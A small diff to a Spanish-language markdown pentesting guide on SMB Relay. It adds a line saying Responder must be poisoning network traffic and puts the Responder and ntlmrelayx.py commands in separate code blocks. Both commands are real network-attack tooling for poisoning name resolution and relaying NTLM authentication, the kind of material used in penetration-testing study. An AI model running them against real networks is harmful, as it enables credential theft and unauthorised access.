@@ -34,8 +34,10 @@ sudo nano /usr/share/responder/Responder.conf
 <img src="https://i.imgur.com/XypgqGB.png" />
 
 # Efectuar un SMB Relay por IPv4
-
+El Responder debe estar activo envenenando el tráfico de la red,
 ```
 python /usr/share/responder.py -I tun0 -rdw
+```
+```
 ntlmrelayx.py -tf <targets.txt> -smb2support
 ```
